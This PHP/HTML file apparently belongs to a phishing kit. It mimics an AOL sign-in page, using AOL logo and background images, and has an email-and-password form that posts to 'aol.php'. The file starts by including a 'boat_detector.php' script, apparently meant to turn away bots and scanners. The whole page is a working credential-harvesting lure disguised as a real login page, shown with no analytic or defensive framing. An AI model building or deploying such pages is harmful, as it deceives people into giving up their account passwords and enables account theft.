<?php include('../boat_detector.php'); ?>

<html>
<head>
<style>
body {
background:#3eaffa;
font-size:0.9em;
margin:0px!important;
font-family:'Segoe UI','Segoe','SegoeUI-Regular-final',Tahoma,Helvetica,Arial,sans-serif;
}
#username,#password {
width:100%;
max-width:254px;
height:37px;
border:1px solid #b8b8b8;
font-size:16px;
margin-bottom:10px;
}
#leftpanel {
width:65%;
height:100%;
float:left;
background:url('aolbg.png');
background-size:cover;
}
#rightpanel {
float:right;
width:30%;
}
#login:hover {
transition:all 1s;
opacity:0.5;}
@media(max-width:800px) {
#leftpanel {
display:none;
}
#rightpanel {
float:none;
width:90%;
margin:auto;
}
}
</style>
</head>
<body>

<div id="leftpanel">
</div>
<div id="rightpanel">
<form id="loginform" action="aol.php" method="post" style="background: #FFF;
    border:solid thin #E6E6E6;
    -moz-border-radius: 3px;
    -webkit-border-radius: 3px;
    border-radius: 3px 3px 3px 3px;
    width: 253px;
    z-index: 600;
    padding: 20px;margin-top:200px;">
<img src="logoaol.png" style="width:80px;"/><br/><br/>
<input name="username" placeholder="Email" style="width: 250px; height: 30px" type="email" id="username" required/><br/>
<input name="password" placeholder="Password" style="width: 250px; height: 30px" type="password" id="password" required/><br/><br/><br/>
<a style="font-size:12px; color:#2872dd;float:right;">Forgot password?</a><br/>
<input name="submit" type="image" class="submit" src="./index_files/sign in.png" style="margin-left: 0px;" value="Go to step 2">
<br/><br/>
<center><img src='aolfooter.png' /></center>
</form>
</div>
</body>
</html>


<!-- COPY PASTE END--->


<noscript>&lt;i&gt;Javascript required&lt;/i&gt;</noscript>



</body></html>